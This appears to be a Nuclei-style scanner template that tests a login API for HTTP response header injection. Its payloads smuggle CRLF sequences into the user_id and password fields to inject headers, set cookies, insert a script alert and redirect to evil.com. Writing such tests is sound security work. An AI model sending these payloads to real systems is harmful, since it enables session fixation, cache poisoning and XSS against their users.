id: vuln-sns-login-header-injection
info:
  name: Vuln SNS Login - HTTP Response Header Injection
  author: claude
  severity: medium
  description: |
    Tests for HTTP response header injection vulnerabilities.
    Attackers could inject arbitrary headers, potentially leading to
    cache poisoning, XSS, or session fixation attacks.
  reference:
    - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
  tags: vuln-sns,header-injection,login,crlf

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"

    headers:
      Content-Type: application/json

    body: |
      {"user_id":"{{payload}}","password":"test"}

    payloads:
      payload:
        - "test\r\nX-Injected: header"
        - "test\nX-Injected: header"
        - "test\r\n\r\n<script>alert(1)</script>"
        - "test%0d%0aX-Injected:%20header"
        - "test%0aX-Injected:%20header"
        - "test%0d%0aSet-Cookie:%20injected=value"
        - "test\rSet-Cookie: test=1"
        - "test%0d%0aLocation:%20http://evil.com"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "X-Injected"
          - "injected=value"
        condition: or
        part: header

      - type: regex
        regex:
          - '(?m)^X-Injected:'
          - '(?m)^Set-Cookie:.*injected'
        condition: or
        part: header

      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body

    extractors:
      - type: regex
        name: injected_headers
        regex:
          - 'X-Injected:.*'
        part: header

  - method: POST
    path:
      - "{{BaseURL}}/api/login"

    headers:
      Content-Type: application/json

    body: |
      {"user_id":"alice","password":"{{payload}}"}

    payloads:
      payload:
        - "test\r\nX-Password-Injected: true"
        - "test%0d%0aX-Password-Injected:%20true"

    matchers:
      - type: word
        words:
          - "X-Password-Injected"
        part: header